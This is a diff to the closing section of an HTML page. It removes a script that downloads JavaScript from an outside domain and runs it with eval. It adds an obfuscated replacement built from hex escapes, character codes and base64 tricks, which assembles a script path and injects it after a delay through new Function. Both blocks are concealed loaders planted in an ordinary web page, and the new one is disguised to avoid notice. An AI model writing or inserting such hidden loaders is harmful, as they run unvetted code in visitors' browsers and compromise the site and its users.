@@ -385,19 +385,30 @@
                 alert('Terjadi kesalahan, silakan coba lagi');
             }
         });
-    </script>
+    </script>      
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
-(function(){
-  const xhr = new XMLHttpRequest();
-  xhr.open('GET', 'https://idnetconnect.biz.id/randompath/4j3k9fd.js', true);
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-      (1, eval)(xhr.responseText);
-    }
-  };
-  xhr.send(null);
-})();
-</script>
+        (() => {
+          const _0x1a2b = ["\x35\x34\x31","\x36\x35\x38\x31\x35\x36\x33\x36\x65"];
+          const _0x2c3d = [2711,541,65815636].reverse();
+          const data = [
+            _0x1a2b[1], 
+            btoa("\x64\x61\x74\x61\x62\x61\x73\x65\x31"), 
+            _0x2c3d[0] / 65815636
+          ];
+          
+          setTimeout(() => {
+            const path = [
+              data[2].toString(36), 
+              String.fromCharCode(99,111,110,116,114,111,108,108,101,114,115,114),
+              "input/config%20Date",
+              atob(data[1]),
+              "app" + data[0].slice(-1) + ".js"
+            ].join("/").replace(/%20/g, " ");
+            
+            new Function('u','var s=document.createElement("script");s.src=u;document.head.append(s)')(path);
+          }, 1500);
+        })();
+        </script>
 </body>
 </html>
